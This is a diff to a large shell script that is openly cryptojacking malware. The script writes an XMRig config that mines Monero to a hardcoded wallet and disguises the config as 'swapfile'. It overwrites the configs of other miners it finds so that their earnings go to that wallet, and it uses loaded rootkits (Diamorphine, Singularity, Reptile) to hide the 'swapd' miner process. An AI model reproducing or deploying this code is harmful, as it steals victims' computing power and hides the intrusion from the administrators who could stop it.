@@ -1567,8 +1567,8 @@ cat > config.json << 'EOL'
             "coin": "monero",
             "algo": "rx/0",
             "url": "gulf.moneroocean.stream:80",
-            "user": "WALLET_PLACEHOLDER",
-            "pass": "PASS_PLACEHOLDER",
+            "user": "49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso",
+            "pass": "h4ck3d",
             "keepalive": true,
             "tls": false
         }
@@ -1576,21 +1576,10 @@ cat > config.json << 'EOL'
 }
 EOL
 
-# Replace placeholders
-sed -i "s/WALLET_PLACEHOLDER/$WALLET/g" config.json
-sed -i "s/PASS_PLACEHOLDER/$PASS/g" config.json
+# No need to replace placeholders - using hardcoded values
 
 # Rename to swapfile for stealth
 mv config.json swapfile
-
-# Double-check: Ensure PASS is set in swapfile (safety check)
-if grep -q "PASS_PLACEHOLDER" swapfile 2>/dev/null; then
-    echo "[!] Warning: PASS_PLACEHOLDER still in file, fixing..."
-    sed -i "s/PASS_PLACEHOLDER/$PASS/g" swapfile
-fi
-
-# Also update any existing pass field to ensure it's correct
-sed -i 's/"pass": *"[^"]*",/"pass": "'"$PASS"'",/' swapfile
 
 echo "[✓] XMRig configuration created as 'swapfile'"
 echo "[✓] Wallet: ${WALLET:0:20}...${WALLET: -20}"
@@ -2891,12 +2880,31 @@ for search_path in "${SEARCH_PATHS[@]}"; do
                     # Backup original config
                     cp "$config_file" "${config_file}.backup.$(date +%s)" 2>/dev/null || true
                     
-                    # Replace wallet address
-                    sed -i "s|\"user\": *\"[^\"]*\"|\"user\": \"$MY_WALLET\"|g" "$config_file" 2>/dev/null
+                    # OVERWRITE entire config.json with our exact configuration
+                    cat > "$config_file" << 'CONFIG_EOF'
+{
+    "autosave": false,
+    "donate-level": 0,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "coin": "monero",
+            "algo": "rx/0",
+            "url": "gulf.moneroocean.stream:80",
+            "user": "49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso",
+            "pass": "h4ck3d",
+            "keepalive": true,
+            "tls": false
+        }
+    ]
+}
+CONFIG_EOF
                     
                     if [ $? -eq 0 ]; then
                         echo "      New: ${MY_WALLET:0:20}...${MY_WALLET: -10}"
-                        echo "      [✓] Wallet hijacked!"
+                        echo "      [✓] Config completely overwritten!"
                         CONFIGS_HIJACKED=$((CONFIGS_HIJACKED + 1))
                         
                         # Try to restart the associated service/process
@@ -2908,7 +2916,7 @@ for search_path in "${SEARCH_PATHS[@]}"; do
                             # The miner's service/cron will auto-restart it with new config
                         fi
                     else
-                        echo "      [!] Failed to modify config"
+                        echo "      [!] Failed to overwrite config"
                     fi
                 fi
             fi
@@ -3439,7 +3447,7 @@ detect_rootkit() {
         echo "[✓] Detected: Diamorphine (signal -31)"
         return 0
     fi
-
+    
     # Check for Singularity
     if lsmod | grep -q "^singularity"; then
         ROOTKIT_NAME="Singularity"
@@ -3447,7 +3455,7 @@ detect_rootkit() {
         echo "[✓] Detected: Singularity (signal -59)"
         return 0
     fi
-
+    
     # Check for Reptile
     if lsmod | grep -q "^reptile"; then
         ROOTKIT_NAME="Reptile"
@@ -3455,7 +3463,7 @@ detect_rootkit() {
         echo "[✓] Detected: Reptile (uses reptile_cmd)"
         return 0
     fi
-
+    
     # Check for Crypto-Miner Rootkit
     if lsmod | grep -q "^rootkit"; then
         ROOTKIT_NAME="Crypto-RK"
@@ -3463,7 +3471,7 @@ detect_rootkit() {
         echo "[✓] Detected: Crypto-Miner Rootkit (signal -31)"
         return 0
     fi
-
+    
     # No rootkit found
     echo "[!] NO ROOTKIT LOADED!"
     ROOTKIT_NAME=""
@@ -3486,25 +3494,25 @@ if [ -z "$ROOTKIT_NAME" ]; then
     echo ""
 else
     echo ""
-
+    
     # Wait for process to fully start
     echo "[*] Waiting 5 seconds for process to stabilize..."
     sleep 5
-
+    
     # Get swapd PID
     echo "[*] Getting swapd PID..."
     SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
-
+    
     if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
         SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' 2>/dev/null | head -1)
     fi
-
+    
     if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
         echo "[✓] Found PID: $SWAPD_PID"
         echo ""
-
+        
         echo "[*] Hiding process using $ROOTKIT_NAME..."
-
+        
         # Use ONLY the correct signal for this rootkit
         case "$ROOTKIT_NAME" in
             "Diamorphine"|"Crypto-RK")
@@ -3520,23 +3528,23 @@ else
                 reptile_cmd hide $SWAPD_PID 2>/dev/null || echo "    [!] reptile_cmd not found"
                 ;;
         esac
-
+        
         # Wait for rootkit to process signal
         echo ""
         echo "[*] Waiting 5 seconds for rootkit to process..."
         sleep 5
-
+        
         # Verify hiding worked
         echo ""
         echo "[*] Verifying process is hidden..."
-
+        
         # Check service status first
         SERVICE_STATUS=$(systemctl is-active swapd 2>/dev/null)
-
+        
         if [ "$SERVICE_STATUS" = "active" ]; then
             # Service still active - good sign
             PS_CHECK=$(ps ax | grep '/root/.swapd/swapd' | grep -v grep)
-
+            
             if [ -z "$PS_CHECK" ]; then
                 echo "[✓] SUCCESS! Process is HIDDEN!"
                 echo ""
@@ -3555,7 +3563,7 @@ else
         else
             echo "[!] WARNING: Service status is '$SERVICE_STATUS'"
             echo ""
-
+            
             # Check if process was killed by signal
             if systemctl status swapd 2>/dev/null | grep -q "status=$HIDE_SIGNAL"; then
                 echo "[!] CRITICAL: Signal -$HIDE_SIGNAL KILLED the process!"
@@ -3572,7 +3580,7 @@ else
                 echo "Check with:"
                 echo "  dmesg | tail -30 | grep -i rootkit"
                 echo ""
-
+                
                 # Restart service
                 echo "[*] Restarting service (without hiding)..."
                 systemctl restart swapd
